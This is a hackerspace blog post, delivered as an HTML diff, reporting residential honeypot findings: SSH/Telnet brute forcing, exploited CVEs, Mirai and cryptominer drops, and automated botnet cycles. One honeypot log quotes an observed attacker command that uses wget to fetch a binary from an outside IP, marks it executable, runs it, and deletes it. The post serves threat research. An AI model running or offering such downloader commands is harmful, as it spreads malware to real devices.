@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" type="text/css" href="../../../styles.css" />
+    <title>801 Labs: Yesterday's Router, Today's Pivot!</title>
+    <meta property="og:title" content="801 Labs: Yesterday's Router, Today's Pivot!" />
+    <meta property="og:type" content="article" />
+    <meta name="twitter:card" content="summary_large_image">
+    <meta property="og:logo" content="https://801labs.org/images/801labs_favicon.png" />
+    <link rel="icon" type="image/png" href="../../../images/801labs_favicon.png" />
+
+    <meta name="description" content="Hunting Residential Threats and Fighting Automated Botnets" /><meta property="og:description" content="Hunting Residential Threats and Fighting Automated Botnets" />
+    <link rel="canonical" href="https://801labs.org/blog/post/yesterdays-router-todays-pivot/" />
+    <meta property="og:url" content="https://801labs.org/blog/post/yesterdays-router-todays-pivot/" />
+    <meta property="og:image" content="https://801labs.org/blog/post/yesterdays-router-todays-pivot/banner.png" />
+    <meta property="og:image:width" content="1828" />
+    <meta property="og:image:height" content="819" />
+    <meta property="article:author" content="OakAtsume" />
+  </head>
+  <body>
+    <header>
+      <div id="header-content">
+        <div id="site-logo"><a href="../../../">Home</a></div>
+        <label id="nav-menu-toggle" for="nav-collapse-button">
+          <input type="checkbox" id="nav-collapse-button" />
+          <span id="nav-menu-icon"></span>
+        </label>
+        <nav>
+          <ul>
+            <li><a href="../../../about/">About</a></li>
+            <li><a href="../../../blog/">Blog</a></li>
+            <li><a href="../../../get-involved/">Get Involved</a></li>
+            <li><a href="../../../contact/">Contact Us</a></li>
+            <li><a href="../../../donate/" class="nav-donate">Donate &gt;</a></li>
+          </ul>
+        </nav>
+      </div>
+    </header>
+    <div class="container">
+      
+<article class="blog-item">
+  <div class="window">
+    <h1>Blog: Yesterday's Router, Today's Pivot!</h1>
+    <div class="card-body">
+      <p class="description"><span>description:</span> Hunting Residential Threats and Fighting Automated Botnets</p>
+      <p class="tags"><span>tags:</span> <a href="../../../blog/tag/threat-intel/">Threat-Intel</a>, <a href="../../../blog/tag/linux/">Linux</a>, <a href="../../../blog/tag/oaks-internet-safari/">Oaks-Internet-Safari</a></p>
+      <p class="date">
+        <span style="display: inline-block;">date published: 2025-05-29</span>
+         | <span style="display: inline-block;">date updated: 2025-05-29</span>
+      </p>
+      <p class="author">
+        <span class="author-name">author:</span>
+        <img class="author-avatar" src="../../../images/avatars/oak.jpg" alt="OakAtsume's avatar" />
+        <span class="author-name">OakAtsume</span>
+      </p>
+      <p class="cover">
+        <img src="banner.png" alt="Yesterday's Router, Today's Pivot!" />
+      </p>
+    </div>
+    <p><strong>Residential Threat Hunting and the War on Automated Threats and Botnets</strong> </br>
+<em>By: Oak Atsume</em> </br></p>
+<h2>Introduction</h2>
+<p>My goal with this project was simple: to understand what kind of threats are actually hitting people like <em><strong>you and me</strong></em>. Most cybersecurity research focuses on big enterprise or industrial infrastructure. But what about our homes, our routers, our smart devices?</p>
+<p>I believe the residential space deserves more attention. That’s where real people live, and where real threats land. And guess what? Monitoring a home network gives us an unfiltered look into what’s going on across the Internet.</br>
+(<em>Spoiler: it’s a lot of <strong>Mirai</strong> and Crypto <strong>miners</strong></em>) </br></p>
+<h2>Someone's knocking...</h2>
+<p>Since I started running a honeypot in a residential network, one thing became clear: <strong>we're under constant attack!</strong></p>
+<p>Governments like to point fingers at China, Russia, North Korea. But in reality, it's often more mundane. The biggest threat to our digital lives may not be a foreign nation, but instead <strong>the negligence of vendors and users alike!</strong></p>
+<p><img src="country-map.png" alt="Attack Map"></p>
+<h2>Who's Knocking, and What are they doing??</h2>
+<p>The vast majority of attacks I observed targeted Unix-like devices, Routers, IP Cameras, NAS Boxes, etc.<br>
+The attackers typically rely on two approaches:</p>
+<ul>
+<li>
+<p><strong>Brute Force Attacks</strong> on SSH/TELNET credentials.
+<img src="creds.png" alt="Creds-Map"></p>
+</li>
+<li>
+<p><strong>Exploitation of known vulnerabilities</strong> in outdated devices.
+<img src="attack.png" alt="Attack"></p>
+</li>
+</ul>
+<p>It's not sophisticated, but it doesn't have to be! It only takes one vulnerable device to give an attacker a foothold.</p>
+<h3>Notably used CVEs</h3>
+<ul>
+<li><strong>CVE-2024-6047</strong> - Command injection for GeoVision IoT systems</li>
+<li><strong>CVE-2024-4577</strong> - CGI argument injection in PHP (can lead to RCE)</li>
+<li><strong>CVE-2023-1389</strong> - Command injection in TP-Link Archer AX-21 routers</li>
+</ul>
+<p>And more!<br>
+These aren't &quot;zero-days&quot;. They're simply still relevant because <strong>companies don’t patch, and users don’t update</strong>!<br>
+That's the real threat here.</p>
+<h2>They’re In. Now What?</h2>
+<p>Once attackers gain access, they typically drop one of three things:</p>
+<ul>
+<li>A variant of <strong>Mirai</strong> or <strong>Gafgyt</strong> to enroll the device into a botnet</li>
+<li>A <strong>cryptocurrency miner</strong> (usually XMRig)</li>
+<li>A <strong>downloader script</strong> to fetch more malware</li>
+</ul>
+<pre><code class="language-json">  {
+    &quot;ip&quot;: &quot;176.65.148.181&quot;,
+    &quot;port&quot;: 2222,
+    &quot;country&quot;: &quot;Germany&quot;,
+    &quot;city&quot;: null,
+    &quot;lat&quot;: 51.2993,
+    &quot;lon&quot;: 9.491,
+    &quot;firstSeen&quot;: 1745895007,
+    &quot;lastSeen&quot;: 1745895015,
+    &quot;loginPasswordAttempts&quot;: [
+      {
+        &quot;timestamp&quot;: 1745895011,
+        &quot;username&quot;: &quot;root&quot;,
+        &quot;password&quot;: &quot;admin&quot;
+      }
+    ],
+    &quot;loginKeyAttempts&quot;: [
+
+    ],
+    &quot;executedCommands&quot;: [
+      {
+        &quot;timestamp&quot;: 1745895014,
+        &quot;command&quot;: &quot;cd /tmp; wget 209.141.34.106/PangaKenya/KKveTTgaAAsecNNaaaa.x86_64; chmod +x KKveTTgaAAsecNNaaaa.x86_64; ./KKveTTgaAAsecNNaaaa.x86_64 ; rm -rf KKveTTgaAAsecNNaaaa.x86_64; wget 209.141.34.106/PangaKenya/KKveTTgaAAsecNNaaaa.x86; chmod +x KKveTTgaAAsecNNaaaa.x86; ./KKveTTgaAAsecNNaaaa.x86 ; rm -rf KKveTTgaAAsecNNaaaa.x86&quot;,
+        &quot;successful&quot;: true
+      }
+    ],
+    &quot;uploadedFiles&quot;: [
+
+    ],
+    &quot;downloadedFiles&quot;: [
+      {
+        &quot;timestamp&quot;: 1745895014,
+        &quot;filename&quot;: null,
+        &quot;sha&quot;: &quot;811cd6ebeb9e2b7438ad9d7c382db13c1c04b7d520495261093af51797f5d4cc&quot;
+      },
+      {
+        &quot;timestamp&quot;: 1745895014,
+        &quot;filename&quot;: null,
+        &quot;sha&quot;: &quot;9ac2e308b0b30354575bba88169283fa7439d34937a148ccb390bcec3c6e296b&quot;
+      }
+    ]
+  }
+</code></pre>
+<blockquote>
+<p>Example of an observed log.</p>
+</blockquote>
+<p>Often, these devices aren’t the end goal—they’re stepping stones. Your router becomes <strong>someone else’s launchpad</strong>. A pivot point for scanning, attacking, or anonymizing future activity.</p>
+<h2>The Bots Are Winning</h2>
+<p>These threats aren’t launched by people sitting at a keyboard. What I’m observing is an <strong>entirely automated threat landscape</strong>.</p>
+<p>The cycle looks like this:</p>
+<ol>
+<li>Scan</li>
+<li>Fingerprint</li>
+<li>Exploit</li>
+<li>Drop malware</li>
+<li>Monetize</li>
+<li>Move on</li>
+</ol>
+<p>If it fails? No problem. Move to the next IP. It’s a numbers game, and the bots play it well.</p>
+<h2>From Curiosity to Chaos</h2>
+<p>Over the weeks I’ve been running this honeypot, a clear pattern has emerged:</p>
+<ol>
+<li>A new, easy-to-exploit CVE appears</li>
+<li>A fresh botnet variant (often Mirai-based) emerges to exploit it</li>
+<li>It spreads rapidly, monetizing devices along the way</li>
+</ol>
+<p>It happens fast. In days. The ecosystem is efficient, ruthless, and almost entirely unsupervised.</p>
+<h2>Final Thoughts</h2>
+<p>Our homes are on the frontlines of a silent war. And the scariest part? Most people have no idea it’s happening.</p>
+<p>If this project has taught me anything, it’s this: <strong>residential cybersecurity deserves more attention</strong>. Not just for the sake of privacy or convenience, but because our homes are being conscripted into someone else’s cyberwar.</p>
+<p>We may not be able to stop every attack, but we can do something even more powerful: <strong>understand them</strong>. And understanding is the first step toward fighting back.</p>
+<p><img src="atack-logs.png" alt="Skibbity-Toilet"></p>
+<blockquote>
+<p>Break-Thru, I acknowledge this blog is very boring lol; but it's meant to be formal. Hopefully if I have more time I will make some more that are fun!</p>
+</blockquote>
+
+  </div>
+</article>
+
+    </div>
+    <footer>
+      <div id="footer-content">
+        <nav>
+          <h3 class="special-alt-text">Social media links</h3>
+          <ul id="svg-link-list">
+            <li><a class="svg-footer-link" id="svg-discord" href="https://discord.gg/uRSthurdPY">discord</a></li>
+            <li><a class="svg-footer-link" id="svg-twitter" href="https://twitter.com/801labs">twitter</a></li>
+            <li><a class="svg-footer-link" id="svg-meetup" href="https://www.meetup.com/801labs/">meetup</a></li>
+            <li><a class="svg-footer-link" id="svg-youtube" href="https://www.youtube.com/c/801LabsSaltLakeCity">youtube</a></li>
+            <li><a class="svg-footer-link" id="svg-github" href="https://github.com/801labs/">github</a></li>
+          </ul>
+        </nav>
+        <div id="footer-nav-box">
+          <nav>
+            <a href="../../../about/">ABOUT</a>
+            <span>|</span>
+            <a href="../../../blog/">BLOG</a>
+            <span>|</span>
+            <a href="../../../get-involved/">GET INVOLVED</a>
+            <span>|</span>
+            <a href="../../../contact/">CONTACT US</a>
+          </nav>
+          <p>© 2024 801Labs.org. All rights reserved.</p>
+          <p>801 Labs hackerspace is a 501(c)(3) that is open to the public!</p>
+          <p>353 East 200 South Suite #201, Salt Lake City, UT 84111</p>
+          <p>Open Thursdays from 5:00 PM to 10:00 PM and other days by announcement.</p>
+          <p class="bottom-links">
+            <a href="../../../code-of-conduct/">Code of Conduct</a>
+            <span>|</span>
+            <a href="../../../terms/">Terms</a>
+            <span>|</span>
+            <a class="nav-donate" href="../../../donate/">Donate</a>
+          </p>
+        </div>
+      </div>
+    </footer>
+  </body>
+</html>
